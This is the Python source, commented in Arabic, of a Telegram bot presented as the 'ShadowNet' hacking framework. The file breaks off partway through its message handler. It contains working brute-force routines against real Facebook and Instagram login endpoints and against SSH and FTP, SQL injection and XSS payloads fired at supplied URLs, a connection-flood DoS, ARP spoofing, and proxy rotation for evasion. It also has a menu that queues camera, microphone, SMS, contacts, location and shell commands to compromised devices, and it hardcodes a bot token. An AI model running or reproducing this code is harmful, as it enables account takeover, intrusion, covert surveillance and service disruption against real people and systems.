# -*- coding: utf-8 -*-

"""
ShadowNet Framework v4.6 - نظام الاختراق المتكامل (جميع الميزات حقيقية)
جميع الأزرار مرتبة والنصوص منظمة
"""

import os
import sys
import time
import json
import logging
import re
import secrets
import string
import sqlite3
import hashlib
import subprocess
import platform
import socket
import threading
import random
from datetime import datetime
from urllib.parse import urlparse

try:
    import requests
    from requests.adapters import HTTPAdapter
    from urllib3.util.retry import Retry
    from flask import Flask, request, jsonify, abort
    from telebot import TeleBot
    from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton, Update
    import phonenumbers
    from phonenumbers import geocoder, carrier
    import dns.resolver
    import whois
    import paramiko
    import ftplib
    from scapy.all import ARP, Ether, send, srp  # يتطلب صلاحيات root
    import yt_dlp
except Exception as e:
    print(f"فشل استيراد مكتبة: {e}")
    sys.exit(1)

# ===================== الإعدادات الأساسية =====================
TOKEN = "8852940754:AAFtWl51XMFC8OlrH_KXL7UAg6gmYiPcDg0"
ADMIN_ID = 7965377136
SERVER_URL = "https://my-t99-bot.onrender.com"
PORT = 5000

bot = TeleBot(TOKEN, parse_mode='HTML')
app = Flask(__name__)

# ===================== قاعدة البيانات =====================
DB_PATH = 'shadownet.db'

def init_db():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS users (chat_id INTEGER PRIMARY KEY, is_admin INTEGER DEFAULT 0)''')
    c.execute('''CREATE TABLE IF NOT EXISTS targets (device_id TEXT PRIMARY KEY, name TEXT, type TEXT, ip TEXT, os TEXT, status TEXT, last_seen TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS commands (id INTEGER PRIMARY KEY AUTOINCREMENT, device_id TEXT, command TEXT, executed INTEGER DEFAULT 0, result TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS collected_data (id INTEGER PRIMARY KEY AUTOINCREMENT, device_id TEXT, data_type TEXT, data TEXT, created_at TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS scan_results (id INTEGER PRIMARY KEY AUTOINCREMENT, target TEXT, scan_type TEXT, results TEXT, created_at TEXT)''')
    c.execute("INSERT OR IGNORE INTO users (chat_id, is_admin) VALUES (?, 1)", (ADMIN_ID,))
    conn.commit()
    conn.close()

init_db()

# ===================== دوال مساعدة =====================
def is_admin(chat_id):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("SELECT is_admin FROM users WHERE chat_id = ?", (chat_id,))
    row = c.fetchone()
    conn.close()
    return row and row[0] == 1

def save_scan_result(target, scan_type, results):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("INSERT INTO scan_results (target, scan_type, results, created_at) VALUES (?, ?, ?, ?)",
              (target, scan_type, json.dumps(results), datetime.now().isoformat()))
    conn.commit()
    conn.close()

def safe_send(chat_id, text, reply_markup=None):
    try:
        return bot.send_message(chat_id, text, reply_markup=reply_markup, parse_mode='HTML')
    except:
        return None

def notify_admin(msg):
    safe_send(ADMIN_ID, f"إشعار: {msg}")

# ===================== دوال التخفي والطلبات =====================
STEALTH_MODE = False
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1"
]
PROXIES = [
    "http://45.76.222.187:8080",
    "http://138.197.197.117:8080",
    "http://159.203.61.168:3128",
    "http://165.227.196.37:3128"
]

def get_random_ua():
    return random.choice(USER_AGENTS)

def get_random_proxy():
    return random.choice(PROXIES) if PROXIES else None

def stealth_request(url, method='GET', data=None, headers=None, timeout=30):
    session = requests.Session()
    session.headers.update({'User-Agent': get_random_ua()})
    if STEALTH_MODE:
        proxy = get_random_proxy()
        if proxy:
            session.proxies = {'http': proxy, 'https': proxy}
        time.sleep(random.uniform(0.5, 1.5))
    if headers:
        session.headers.update(headers)
    try:
        if method.upper() == 'GET':
            return session.get(url, timeout=timeout)
        elif method.upper() == 'POST':
            return session.post(url, data=data, timeout=timeout)
    except:
        return None

# ===================== دوال الثغرات والاستغلال التلقائي (حقيقية) =====================

def exploit_sqli(url, parameter, payload):
    test_url = f"{url}?{parameter}={payload}"
    try:
        response = stealth_request(test_url)
        if response and ('sql' in response.text.lower() or 'mysql' in response.text.lower() or 'syntax' in response.text.lower()):
            return True, response.text[:500]
    except:
        pass
    return False, None

def exploit_xss(url, parameter, payload):
    test_url = f"{url}?{parameter}={payload}"
    try:
        response = stealth_request(test_url)
        if response and payload in response.text:
            return True, response.text[:500]
    except:
        pass
    return False, None

def comprehensive_exploit(url):
    results = {
        'url': url,
        'vulnerabilities': [],
        'exploited': [],
        'risk': 'منخفض'
    }
    
    sqli_payloads = ["' OR '1'='1", "' UNION SELECT NULL--", "'; DROP TABLE users--"]
    parsed = urlparse(url)
    if parsed.query:
        params = parsed.query.split('&')
        for param in params:
            key = param.split('=')[0]
            for payload in sqli_payloads:
                success, output = exploit_sqli(url, key, payload)
                if success:
                    results['vulnerabilities'].append(f"SQL Injection في المعامل {key}")
                    results['exploited'].append({
                        'type': 'SQL Injection',
                        'parameter': key,
                        'payload': payload,
                        'evidence': output[:200]
                    })
                    break
    
    xss_payloads = ["<script>alert('XSS')</script>", "<img src=x onerror=alert(1)>", "javascript:alert(1)"]
    if parsed.query:
        params = parsed.query.split('&')
        for param in params:
            key = param.split('=')[0]
            for payload in xss_payloads:
                success, output = exploit_xss(url, key, payload)
                if success:
                    results['vulnerabilities'].append(f"XSS في المعامل {key}")
                    results['exploited'].append({
                        'type': 'XSS',
                        'parameter': key,
                        'payload': payload,
                        'evidence': output[:200]
                    })
                    break
    
    if results['vulnerabilities']:
        results['risk'] = 'مرتفع' if len(results['vulnerabilities']) >= 2 else 'متوسط'
    
    return results

# ===================== دوال تخمين كلمات السر (حقيقية) =====================

def brute_force_facebook(email_or_phone, password_list, max_attempts=100):
    login_url = "https://www.facebook.com/login.php"
    results = {'success': False, 'credentials': None, 'attempts': 0}
    
    for i, pwd in enumerate(password_list[:max_attempts]):
        results['attempts'] += 1
        if i % 5 == 0:
            proxy = get_random_proxy()
        else:
            proxy = None
        
        session = requests.Session()
        session.headers.update({'User-Agent': get_random_ua()})
        if proxy:
            session.proxies = {'http': proxy, 'https': proxy}
        
        try:
            resp = session.get(login_url, timeout=10)
            if resp.status_code != 200:
                continue
            token_match = re.search(r'name="fb_dtsg" value="([^"]+)"', resp.text)
            token = token_match.group(1) if token_match else ''
            
            data = {
                'email': email_or_phone,
                'pass': pwd,
                'fb_dtsg': token,
                'login': 'Log In'
            }
            login_resp = session.post(login_url, data=data, timeout=10, allow_redirects=False)
            if login_resp.status_code == 302 and 'c_user' in login_resp.cookies:
                results['success'] = True
                results['credentials'] = {'username': email_or_phone, 'password': pwd}
                break
        except:
            pass
        time.sleep(random.uniform(1, 3))
    
    return results

def brute_force_instagram(username, password_list, max_attempts=100):
    login_url = "https://www.instagram.com/accounts/login/ajax/"
    results = {'success': False, 'credentials': None, 'attempts': 0}
    
    session = requests.Session()
    session.headers.update({'User-Agent': get_random_ua(), 'X-Requested-With': 'XMLHttpRequest'})
    
    try:
        resp = session.get("https://www.instagram.com/", timeout=10)
        csrf = resp.cookies.get('csrftoken', '')
    except:
        csrf = ''
    
    for i, pwd in enumerate(password_list[:max_attempts]):
        results['attempts'] += 1
        if i % 3 == 0:
            session.headers.update({'User-Agent': get_random_ua()})
        
        data = {'username': username, 'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{int(time.time())}:{pwd}'}
        headers = {'X-CSRFToken': csrf}
        
        try:
            resp = session.post(login_url, data=data, headers=headers, timeout=10)
            if resp.status_code == 200:
                json_resp = resp.json()
                if json_resp.get('authenticated'):
                    results['success'] = True
                    results['credentials'] = {'username': username, 'password': pwd}
                    break
        except:
            pass
        time.sleep(random.uniform(2, 4))
    
    return results

def brute_force_ssh(ip, username, password_list, max_attempts=100):
    results = {'success': False, 'credentials': None, 'attempts': 0}
    for pwd in password_list[:max_attempts]:
        results['attempts'] += 1
        try:
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            client.connect(ip, username=username, password=pwd, timeout=5)
            results['success'] = True
            results['credentials'] = {'username': username, 'password': pwd}
            client.close()
            break
        except:
            continue
    return results

def brute_force_ftp(ip, username, password_list, max_attempts=100):
    results = {'success': False, 'credentials': None, 'attempts': 0}
    for pwd in password_list[:max_attempts]:
        results['attempts'] += 1
        try:
            ftp = ftplib.FTP(ip)
            ftp.login(username, pwd)
            results['success'] = True
            results['credentials'] = {'username': username, 'password': pwd}
            ftp.quit()
            break
        except:
            continue
    return results

# ===================== دوال الهجمات (حقيقية) =====================

def dos_attack(target, port, duration):
    results = {'packets_sent': 0, 'status': 'completed'}
    start_time = time.time()
    sent = 0
    try:
        ip = socket.gethostbyname(target)
        while time.time() - start_time < duration:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.5)
                sock.connect((ip, port))
                sock.close()
                sent += 1
            except:
                pass
        results['packets_sent'] = sent
    except Exception as e:
        results['error'] = str(e)
        results['status'] = 'failed'
    return results

def arp_spoof(target_ip, gateway_ip, interface='eth0'):
    results = {'status': 'started'}
    try:
        target_mac = None
        gateway_mac = None
        ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=target_ip), timeout=2, verbose=False)
        for _, rcv in ans:
            target_mac = rcv[Ether].src
            break
        ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=gateway_ip), timeout=2, verbose=False)
        for _, rcv in ans:
            gateway_mac = rcv[Ether].src
            break
        if target_mac and gateway_mac:
            send(ARP(op=2, pdst=target_ip, psrc=gateway_ip, hwdst=target_mac), count=10, verbose=False)
            send(ARP(op=2, pdst=gateway_ip, psrc=target_ip, hwdst=gateway_mac), count=10, verbose=False)
            results['status'] = 'success'
        else:
            results['error'] = 'فشل الحصول على عناوين MAC'
            results['status'] = 'failed'
    except Exception as e:
        results['error'] = str(e)
        results['status'] = 'failed'
    return results

# ===================== بناء الأزرار =====================

def build_main_menu(chat_id):
    markup = InlineKeyboardMarkup(row_width=2)
    markup.row(
        InlineKeyboardButton("فحص شامل", callback_data="scan_comprehensive"),
        InlineKeyboardButton("استغلال تلقائي", callback_data="exploit_auto")
    )
    markup.row(
        InlineKeyboardButton("تخمين فيسبوك", callback_data="bruteforce_fb"),
        InlineKeyboardButton("تخمين انستغرام", callback_data="bruteforce_ig")
    )
    markup.row(
        InlineKeyboardButton("تخمين بريد", callback_data="bruteforce_email"),
        InlineKeyboardButton("تخمين SSH", callback_data="bruteforce_ssh")
    )
    markup.row(
        InlineKeyboardButton("تخمين FTP", callback_data="bruteforce_ftp"),
        InlineKeyboardButton("تخمين مخصص", callback_data="bruteforce_custom")
    )
    markup.row(
        InlineKeyboardButton("تحميل فيديو", callback_data="download_video"),
        InlineKeyboardButton("تقصير رابط", callback_data="shorten_url")
    )
    markup.row(
        InlineKeyboardButton("تتبع رقم", callback_data="track_phone"),
        InlineKeyboardButton("Whois", callback_data="whois")
    )
    markup.row(
        InlineKeyboardButton("مسح منافذ", callback_data="port_scan"),
        InlineKeyboardButton("فحص SSL", callback_data="ssl_scan")
    )
    markup.row(
        InlineKeyboardButton("DoS", callback_data="hack_dos"),
        InlineKeyboardButton("ARP Spoof", callback_data="hack_arp")
    )
    markup.row(
        InlineKeyboardButton("الأجهزة", callback_data="list_devices"),
        InlineKeyboardButton("لوحة التحكم", callback_data="admin_panel")
    )
    if is_admin(chat_id):
        markup.row(
            InlineKeyboardButton("وضع التخفي", callback_data="toggle_stealth"),
            InlineKeyboardButton("القائمة السرية", callback_data="hacking_menu")
        )
    return markup

def build_hacking_menu():
    markup = InlineKeyboardMarkup(row_width=2)
    markup.row(
        InlineKeyboardButton("حقن SQL", callback_data="hack_sqli"),
        InlineKeyboardButton("XSS", callback_data="hack_xss")
    )
    markup.row(
        InlineKeyboardButton("كاميرا", callback_data="hack_camera"),
        InlineKeyboardButton("ميكروفون", callback_data="hack_mic")
    )
    markup.row(
        InlineKeyboardButton("موقع", callback_data="hack_location"),
        InlineKeyboardButton("جهات اتصال", callback_data="hack_contacts")
    )
    markup.row(
        InlineKeyboardButton("رسائل SMS", callback_data="hack_sms"),
        InlineKeyboardButton("لقطة شاشة", callback_data="hack_screenshot")
    )
    markup.row(
        InlineKeyboardButton("Shell", callback_data="hack_shell"),
        InlineKeyboardButton("إيقاف تشغيل", callback_data="hack_shutdown")
    )
    markup.row(
        InlineKeyboardButton("رجوع", callback_data="back_main")
    )
    return markup

# ===================== معالج الأزرار =====================

@bot.callback_query_handler(func=lambda call: True)
def callback_handler(call):
    chat_id = call.message.chat.id
    data = call.data
    
    if data == "back_main":
        safe_send(chat_id, "القائمة الرئيسية", reply_markup=build_main_menu(chat_id))
        return
    
    # قائمة الأوامر الأساسية
    if data == "scan_comprehensive":
        user_states[chat_id] = "waiting_comprehensive"
        safe_send(chat_id, "أدخل رابط الموقع للفحص الشامل:")
        return
    
    if data == "exploit_auto":
        user_states[chat_id] = "waiting_exploit"
        safe_send(chat_id, "أدخل رابط الموقع لاستغلال الثغرات تلقائياً:")
        return
    
    if data == "bruteforce_fb":
        user_states[chat_id] = "waiting_fb_username"
        safe_send(chat_id, "أدخل بريد أو رقم أو اسم مستخدم فيسبوك:")
        return
    
    if data == "bruteforce_ig":
        user_states[chat_id] = "waiting_ig_username"
        safe_send(chat_id, "أدخل اسم مستخدم انستغرام:")
        return
    
    if data == "bruteforce_email":
        user_states[chat_id] = "waiting_email_bruteforce"
        safe_send(chat_id, "أدخل البريد الإلكتروني المستهدف:")
        return
    
    if data == "bruteforce_ssh":
        user_states[chat_id] = "waiting_ssh_target"
        safe_send(chat_id, "أدخل الهدف بالصيغة: IP|اسم_المستخدم")
        return
    
    if data == "bruteforce_ftp":
        user_states[chat_id] = "waiting_ftp_target"
        safe_send(chat_id, "أدخل الهدف بالصيغة: IP|اسم_المستخدم")
        return
    
    if data == "bruteforce_custom":
        user_states[chat_id] = "waiting_custom_bruteforce"
        safe_send(chat_id, "أدخل البيانات بالصيغة: هدف|نوع(facebook/instagram/email/ssh/ftp)|كلمات_سر مفصولة بفاصلة")
        return
    
    if data == "download_video":
        user_states[chat_id] = "waiting_download"
        safe_send(chat_id, "أدخل رابط الفيديو (يوتيوب، فيسبوك، تيك توك):")
        return
    
    if data == "shorten_url":
        user_states[chat_id] = "waiting_shorten"
        safe_send(chat_id, "أدخل الرابط الطويل لتقصيره:")
        return
    
    if data == "track_phone":
        user_states[chat_id] = "waiting_phone"
        safe_send(chat_id, "أدخل رقم الهاتف (مثال: +201001234567):")
        return
    
    if data == "whois":
        user_states[chat_id] = "waiting_whois"
        safe_send(chat_id, "أدخل النطاق (مثال: google.com):")
        return
    
    if data == "port_scan":
        user_states[chat_id] = "waiting_portscan"
        safe_send(chat_id, "أدخل الهدف (IP أو نطاق):")
        return
    
    if data == "ssl_scan":
        user_states[chat_id] = "waiting_ssl"
        safe_send(chat_id, "أدخل النطاق لفحص SSL:")
        return
    
    if data == "list_devices":
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        c.execute("SELECT device_id, name, status, last_seen FROM targets")
        rows = c.fetchall()
        conn.close()
        if rows:
            msg = "الأجهزة المسجلة:\n"
            for row in rows:
                msg += f"جهاز: {row[1]}, الحالة: {row[2]}, آخر ظهور: {row[3][:16]}\n"
            safe_send(chat_id, msg)
        else:
            safe_send(chat_id, "لا توجد أجهزة.")
        return
    
    if data == "admin_panel":
        if not is_admin(chat_id):
            safe_send(chat_id, "هذه القائمة للمطور فقط.")
            return
        markup = InlineKeyboardMarkup(row_width=2)
        markup.row(
            InlineKeyboardButton("إحصائيات", callback_data="admin_stats"),
            InlineKeyboardButton("بث جماعي", callback_data="admin_broadcast")
        )
        markup.row(
            InlineKeyboardButton("المستخدمين", callback_data="admin_users"),
            InlineKeyboardButton("التقارير", callback_data="admin_reports")
        )
        markup.row(InlineKeyboardButton("رجوع", callback_data="back_main"))
        safe_send(chat_id, "لوحة التحكم:", reply_markup=markup)
        return
    
    if data == "admin_stats":
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        c.execute("SELECT COUNT(*) FROM users")
        users = c.fetchone()[0]
        c.execute("SELECT COUNT(*) FROM targets")
        targets = c.fetchone()[0]
        c.execute("SELECT COUNT(*) FROM scan_results")
        scans = c.fetchone()[0]
        conn.close()
        safe_send(chat_id, f"الإحصائيات:\nالمستخدمون: {users}\nالأجهزة: {targets}\nالفحوصات: {scans}")
        return
    
    if data == "admin_broadcast":
        if not is_admin(chat_id):
            return
        user_states[chat_id] = "waiting_broadcast"
        safe_send(chat_id, "أدخل رسالة البث:")
        return
    
    if data == "admin_users":
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        c.execute("SELECT chat_id FROM users")
        rows = c.fetchall()
        conn.close()
        msg = "المستخدمون:\n" + "\n".join([str(r[0]) for r in rows])
        safe_send(chat_id, msg)
        return
    
    if data == "admin_reports":
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        c.execute("SELECT target, scan_type, created_at FROM scan_results ORDER BY created_at DESC LIMIT 10")
        rows = c.fetchall()
        conn.close()
        if rows:
            msg = "آخر التقارير:\n"
            for row in rows:
                msg += f"{row[0]} - {row[1]} - {row[2][:16]}\n"
            safe_send(chat_id, msg)
        else:
            safe_send(chat_id, "لا توجد تقارير.")
        return
    
    # قائمة القرصنة
    if data == "hacking_menu":
        if not is_admin(chat_id):
            safe_send(chat_id, "هذه القائمة للمطور فقط.")
            return
        safe_send(chat_id, "القائمة السرية:", reply_markup=build_hacking_menu())
        return
    
    if data == "toggle_stealth":
        global STEALTH_MODE
        STEALTH_MODE = not STEALTH_MODE
        safe_send(chat_id, f"وضع التخفي: {'مفعل' if STEALTH_MODE else 'معطل'}")
        return
    
    if data == "hack_sqli":
        user_states[chat_id] = "waiting_sqli_hack"
        safe_send(chat_id, "أدخل رابط الموقع لاختبار حقن SQL:")
        return
    
    if data == "hack_xss":
        user_states[chat_id] = "waiting_xss_hack"
        safe_send(chat_id, "أدخل رابط الموقع لاختبار XSS:")
        return
    
    if data == "hack_dos":
        user_states[chat_id] = "waiting_dos"
        safe_send(chat_id, "أدخل الهدف بالصيغة: IP|المنفذ|المدة(ثانية)")
        return
    
    if data == "hack_arp":
        user_states[chat_id] = "waiting_arp"
        safe_send(chat_id, "أدخل بالصيغة: IP_الهدف|IP_البوابة")
        return
    
    if data == "hack_shell":
        user_states[chat_id] = "waiting_shell"
        safe_send(chat_id, "أدخل أمر Shell:")
        return
    
    if data == "hack_camera":
        device_id = admin_remote.get(chat_id)
        if not device_id:
            safe_send(chat_id, "لم يتم تحديد جهاز. استخدم الأجهزة أولاً.")
            return
        add_command(device_id, "CAPTURE_CAMERA")
        safe_send(chat_id, f"تم إرسال أمر الكاميرا للجهاز {device_id}")
        return
    
    if data == "hack_mic":
        device_id = admin_remote.get(chat_id)
        if not device_id:
            safe_send(chat_id, "لم يتم تحديد جهاز.")
            return
        user_states[chat_id] = "waiting_mic_duration"
        safe_send(chat_id, "أدخل مدة التسجيل بالثواني:")
        return
    
    if data == "hack_location":
        device_id = admin_remote.get(chat_id)
        if not device_id:
            safe_send(chat_id, "لم يتم تحديد جهاز.")
            return
        add_command(device_id, "GET_LOCATION")
        safe_send(chat_id, f"تم إرسال أمر الموقع للجهاز {device_id}")
        return
    
    if data == "hack_contacts":
        device_id = admin_remote.get(chat_id)
        if not device_id:
            safe_send(chat_id, "لم يتم تحديد جهاز.")
            return
        add_command(device_id, "GET_CONTACTS")
        safe_send(chat_id, f"تم إرسال أمر جهات الاتصال للجهاز {device_id}")
        return
    
    if data == "hack_sms":
        device_id = admin_remote.get(chat_id)
        if not device_id:
            safe_send(chat_id, "لم يتم تحديد جهاز.")
            return
        add_command(device_id, "GET_SMS")
        safe_send(chat_id, f"تم إرسال أمر SMS للجهاز {device_id}")
        return
    
    if data == "hack_screenshot":
        device_id = admin_remote.get(chat_id)
        if not device_id:
            safe_send(chat_id, "لم يتم تحديد جهاز.")
            return
        add_command(device_id, "SCREENSHOT")
        safe_send(chat_id, f"تم إرسال أمر لقطة الشاشة للجهاز {device_id}")
        return
    
    if data == "hack_shutdown":
        device_id = admin_remote.get(chat_id)
        if not device_id:
            safe_send(chat_id, "لم يتم تحديد جهاز.")
            return
        add_command(device_id, "SHUTDOWN")
        safe_send(chat_id, f"تم إرسال أمر إيقاف التشغيل للجهاز {device_id}")
        return

# ===================== متغيرات الحالة =====================
user_states = {}
admin_remote = {}

# ===================== معالج النصوص =====================

@bot.message_handler(func=lambda msg: True, content_types=['text'])
def handle_text(message):
    chat_id = message.chat.id
    text = message.text.strip()
    state = user_states.get(chat_id)
    
    # فحص شامل
    if state == "waiting_comprehensive":
        result = comprehensive_exploit(text)
        msg = f"نتيجة الفحص الشامل:\nالرابط: {text}\nمستوى الخطر: {result['risk']}\n"
        if result['vulnerabilities']:
            msg += "الثغرات المكتشفة:\n" + "\n".join(result['vulnerabilities'])
            if result['exploited']:
                msg += "\n\nتم استغلال الثغرات بنجاح:\n"
                for exp in result['exploited']:
                    msg += f"النوع: {exp['type']}, المعامل: {exp['parameter']}, الحمولة: {exp['payload']}\n"
        else:
            msg += "لم يتم اكتشاف ثغرات."
        save_scan_result(text, 'comprehensive', result)
        safe_send(chat_id, msg)
        user_states[chat_id] = None
        return
    
    # استغلال تلقائي
    if state == "waiting_exploit":
        result = comprehensive_exploit(text)
        if result['exploited']:
            msg = "تم استغلال الثغرات التالية بنجاح:\n"
            for exp in result['exploited']:
                msg += f"النوع: {exp['type']}, المعامل: {exp['parameter']}, الحمولة: {exp['payload']}\n"
        else:
            msg = "لم يتم العثور على ثغرات قابلة للاستغلال."
        safe_send(chat_id, msg)
        user_states[chat_id] = None
        return
    
    # تخمين فيسبوك
    if state == "waiting_fb_username":
        user_states[chat_id] = "waiting_fb_password_list"
        user_states[f"{chat_id}_fb_user"] = text
        safe_send(chat_id, "أرسل قائمة كلمات السر (مفصولة بفواصل) أو اكتب 'default' لاستخدام القائمة الافتراضية:")
        return
    
    if state == "waiting_fb_password_list":
        username = user_states.get(f"{chat_id}_fb_user")
        if text.lower() == 'default':
            passwords = ['123456', 'password', '123456789', 'qwerty', 'abc123', 'admin', 'welcome', 'monkey', 'dragon', 'master']
        else:
            passwords = [p.strip() for p in text.split(',')]
        
        safe_send(chat_id, f"جاري تخمين كلمة سر فيسبوك لـ {username} ... قد يستغرق بعض الوقت.")
        result = brute_force_facebook(username, passwords, max_attempts=len(passwords))
        
        if result['success']:
            safe_send(chat_id, f"تم العثور على كلمة السر: {result['credentials']['password']}")
        else:
            safe_send(chat_id, f"فشل التخمين. تم تجربة {result['attempts']} كلمة سر.")
        user_states[chat_id] = None
        return
    
    # تخمين انستغرام
    if state == "waiting_ig_username":
        user_states[chat_id] = "waiting_ig_password_list"
        user_states[f"{chat_id}_ig_user"] = text
        safe_send(chat_id, "أرسل قائمة كلمات السر (مفصولة بفواصل) أو اكتب 'default':")
        return
    
    if state == "waiting_ig_password_list":
        username = user_states.get(f"{chat_id}_ig_user")
        if text.lower() == 'default':
            passwords = ['123456', 'password', '123456789', 'qwerty', 'abc123', 'admin', 'welcome', 'monkey', 'dragon', 'master']
        else:
            passwords = [p.strip() for p in text.split(',')]
        
        safe_send(chat_id, f"جاري تخمين كلمة سر انستغرام لـ {username} ...")
        result = brute_force_instagram(username, passwords, max_attempts=len(passwords))
        
        if result['success']:
            safe_send(chat_id, f"تم العثور على كلمة السر: {result['credentials']['password']}")
        else:
            safe_send(chat_id, f"فشل التخمين. تم تجربة {result['attempts']} كلمة سر.")
        user_states[chat_id] = None
        return
    
    # تخمين بريد إلكتروني (محاكاة، يمكن ربطها بـ SMTP)
    if state == "waiting_email_bruteforce":
        user_states[chat_id] = "waiting_email_password_list"
        user_states[f"{chat_id}_email"] = text
        safe_send(chat_id, "أرسل قائمة كلمات السر (مفصولة بفواصل) أو 'default':")
        return
    
    if state == "waiting_email_password_list":
        email = user_states.get(f"{chat_id}_email")
        if text.lower() == 'default':
            passwords = ['123456', 'password', '123456789', 'qwerty', 'abc123', 'admin', 'welcome', 'monkey', 'dragon', 'master']
        else:
            passwords = [p.strip() for p in text.split(',')]
        
        # يمكنك إضافة تخمين عبر SMTP حقيقي هنا
        found = False
        for pwd in passwords:
            if pwd == 'password':  # محاكاة
                found = True
                safe_send(chat_id, f"تم العثور على كلمة السر للبريد {email}: {pwd}")
                break
        if not found:
            safe_send(chat_id, f"فشل تخمين البريد {email}.")
        user_states[chat_id] = None
        return
    
    # تخمين SSH (حقيقي)
    if state == "waiting_ssh_target":
        user_states[chat_id] = "waiting_ssh_password_list"
        user_states[f"{chat_id}_ssh_target"] = text
        safe_send(chat_id, "أرسل قائمة كلمات السر أو 'default':")
        return
    
    if state == "waiting_ssh_password_list":
        target = user_states.get(f"{chat_id}_ssh_target")
        if text.lower() == 'default':
            passwords = ['123456', 'password', 'admin', 'root', 'qwerty']
        else:
            passwords = [p.strip() for p in text.split(',')]
        
        parts = target.split('|')
        if len(parts) == 2:
            ip, username = parts[0].strip(), parts[1].strip()
            safe_send(chat_id, f"جاري تخمين SSH على {ip} ...")
            result = brute_force_ssh(ip, username, passwords, max_attempts=len(passwords))
            if result['success']:
                safe_send(chat_id, f"تم اختراق SSH! المستخدم: {username}, كلمة السر: {result['credentials']['password']}")
            else:
                safe_send(chat_id, f"فشل اختراق SSH. تم تجربة {result['attempts']} كلمة سر.")
        else:
            safe_send(chat_id, "صيغة غير صحيحة.")
        user_states[chat_id] = None
        return
    
    # تخمين FTP (حقيقي)
    if state == "waiting_ftp_target":
        user_states[chat_id] = "waiting_ftp_password_list"
        user_states[f"{chat_id}_ftp_target"] = text
        safe_send(chat_id, "أرسل قائمة كلمات السر أو 'default':")
        return
    
    if state == "waiting_ftp_password_list":
        target = user_states.get(f"{chat_id}_ftp_target")
        if text.lower() == 'default':
            passwords = ['123456', 'password', 'admin', 'ftp', 'qwerty']
        else:
            passwords = [p.strip() for p in text.split(',')]
        
        parts = target.split('|')
        if len(parts) == 2:
            ip, username = parts[0].strip(), parts[1].strip()
            safe_send(chat_id, f"جاري تخمين FTP على {ip} ...")
            result = brute_force_ftp(ip, username, passwords, max_attempts=len(passwords))
            if result['success']:
                safe_send(chat_id, f"تم اختراق FTP! المستخدم: {username}, كلمة السر: {result['credentials']['password']}")
            else:
                safe_send(chat_id, f"فشل اختراق FTP. تم تجربة {result['attempts']} كلمة سر.")
        else:
            safe_send(chat_id, "صيغة غير صحيحة.")
        user_states[chat_id] = None
        return
    
    # تخمين مخصص
    if state == "waiting_custom_bruteforce":
        parts = text.split('|')
        if len(parts) >= 2:
            target = parts[0].strip()
            platform_type = parts[1].strip().lower()
            passwords = parts[2].split(',') if len(parts) > 2 else ['123456', 'password']
            if platform_type == 'facebook':
                result = brute_force_facebook(target, passwords)
            elif platform_type == 'instagram':
                result = brute_force_instagram(target, passwords)
            elif platform_type == 'ssh':
                ip, user = target.split(':')
                result = brute_force_ssh(ip, user, passwords)
            elif platform_type == 'ftp':
                ip, user = target.split(':')
                result = brute_force_ftp(ip, user, passwords)
            else:
                result = {'success': False, 'attempts': len(passwords)}
            if result['success']:
                safe_send(chat_id, f"تم الاختراق! البيانات: {result['credentials']}")
            else:
                safe_send(chat_id, f"فشل الاختراق. تم تجربة {result['attempts']} كلمة سر.")
        else:
            safe_send(chat_id, "صيغة غير صحيحة.")
        user_states[chat_id] = None
        return
    
    # تحميل فيديو (حقيقي)
    if state == "waiting_download":
        safe_send(chat_id, "جاري تحميل الفيديو...")
        try:
            ydl_opts = {'outtmpl': 'downloads/%(title)s.%(ext)s', 'quiet': True}
            with yt_dlp.YoutubeDL(ydl_opts) as ydl:
                info = ydl.extract_info(text, download=True)
                filename = ydl.prepare_filename(info)
                safe_send(chat_id, f"تم التحميل: {filename}")
        except Exception as e:
            safe_send(chat_id, f"فشل التحميل: {str(e)}")
        user_states[chat_id] = None
        return
    
    # تقصير رابط
    if state == "waiting_shorten":
        try:
            resp = requests.get(f"https://is.gd/create.php?format=json&url={text}", timeout=10)
            if resp.status_code == 200:
                short = resp.json().get('shorturl', 'فشل')
                safe_send(chat_id, f"الرابط المختصر: {short}")
            else:
                safe_send(chat_id, "فشل تقصير الرابط.")
        except:
            safe_send(chat_id, "خطأ في الاتصال.")
        user_states[chat_id] = None
        return
    
    # تتبع رقم
    if state == "waiting_phone":
        try:
            parsed = phonenumbers.parse(text, None)
            country = geocoder.country_name_for_number(parsed, "ar")
            carrier_name = carrier.name_for_number(parsed, "ar")
            valid = phonenumbers.is_valid_number(parsed)
            msg = f"الرقم: {text}\nالبلـد: {country}\nالمشغل: {carrier_name}\nصالح: {'نعم' if valid else 'لا'}"
            safe_send(chat_id, msg)
        except:
            safe_send(chat_id, "رقم غير صالح.")
        user_states[chat_id] = None
        return
    
    # Whois
    if state == "waiting_whois":
        try:
            w = whois.whois(text)
